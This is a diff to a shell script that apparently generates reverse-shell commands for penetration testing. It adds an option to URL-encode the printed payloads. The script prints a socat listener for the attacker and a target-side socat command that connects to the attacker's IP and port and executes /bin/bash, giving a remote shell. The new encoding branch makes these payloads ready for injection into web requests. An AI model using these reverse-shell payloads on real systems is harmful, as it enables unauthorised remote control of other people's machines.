@@ -1,5 +1,14 @@
-echo -e "\033[31m\033[1mwaiting for the connection at $IP:\033[m"
-echo -e "\t\033[1msocat -d -d TCP4-LISTEN:$PORT STDOUT\033[m"
-
-echo -e "\033[31m\033[1mON TARGET:\033[m"
-echo -e "\t\033[1msocat TCP4:$IP:$PORT EXEC:/bin/bash\033[m"
+if [ $ENCODE == "True" ]
+then
+	echo -e "\033[31m\033[1mwaiting for the connection at $IP:\033[m"
+	url_encode "socat -d -d TCP4-LISTEN:$PORT STDOUT"
+	echo -e "\033[31m\033[1mON TARGET:\033[m"
+	url_encode "socat TCP4:$IP:$PORT EXEC:/bin/bash"
+	echo -e "\033[m"
+else
+	echo -e "\033[31m\033[1mwaiting for the connection at $IP:\033[m"
+	echo -e "\t\033[1msocat -d -d TCP4-LISTEN:$PORT STDOUT\033[m"
+	echo -e "\033[31m\033[1mON TARGET:\033[m"
+	echo -e "\t\033[1msocat TCP4:$IP:$PORT EXEC:/bin/bash\033[m"
+	echo -e "\033[m"
+fi
